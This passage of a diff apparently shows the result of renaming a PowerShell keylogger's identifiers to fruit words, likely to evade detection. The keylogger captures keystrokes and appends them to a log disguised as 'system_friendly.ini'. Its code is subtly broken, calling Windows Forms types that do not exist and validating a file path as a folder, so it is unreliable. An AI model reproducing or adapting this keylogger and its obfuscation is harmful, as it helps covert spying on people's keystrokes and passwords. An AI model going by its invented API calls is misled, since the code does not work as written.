@@ -55,13 +55,14 @@ Function Invoke-Keylogger
 
 RESULT:
 ```
-function Invoke-AppleRaspberry
+Function Invoke-AppleRaspberry
 {
     Param (
         [Parameter()] 
         [ValidateScript({test-path $_ -PathType 'Container'})] 
         [string] $BananaCucumber = "$pwd\system"+"_"+"friendly.ini"
     )
+
     add-type -assemblyName System.Windows.forms
     $Blueberry = New-object System.Windows.forms.HookEventHandler {
         Param ($sender, $e)
@@ -69,6 +70,7 @@ function Invoke-AppleRaspberry
         out-file -filepath $BananaCucumber -inputobject "$e - $PricklypearKiwi" -append
         write "$e - $PricklypearKiwi"
     }
+
     [System.Windows.forms.Application]::AddMessageFilter([System.Windows.forms.KeyboardHookListener])
     [System.Windows.forms.KeyboardHookListener]::Start($Blueberry)
 }
